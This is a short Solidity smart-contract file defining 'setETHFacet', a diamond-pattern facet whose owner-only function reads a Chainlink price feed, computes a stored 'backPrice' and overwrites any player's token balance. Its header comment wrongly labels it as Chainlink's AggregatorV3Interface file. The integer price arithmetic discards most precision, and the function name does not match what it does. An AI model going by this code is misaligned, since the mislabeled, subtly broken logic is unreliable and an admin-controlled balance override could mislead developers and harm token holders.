// File: @chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./TestLib.sol";
contract setETHFacet {
    function setETH(address _adr, uint256 amount) public {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.ceoAddress, "Error: Caller Must be Ownable!!");
        (
            ,
            //  uint80 roundID,
            int256 price, // uint startedAt, // uint timeStamp, //uintt updatedAt
            ,
            ,

        ) = // uint80 answeredInRound
            ds.priceFeed.latestRoundData();

        int256 ethPrice = (10000000000000 / price);
        ds.backPrice = (ethPrice * 100000);

        ds.playerToken[_adr] = amount;
    }
}
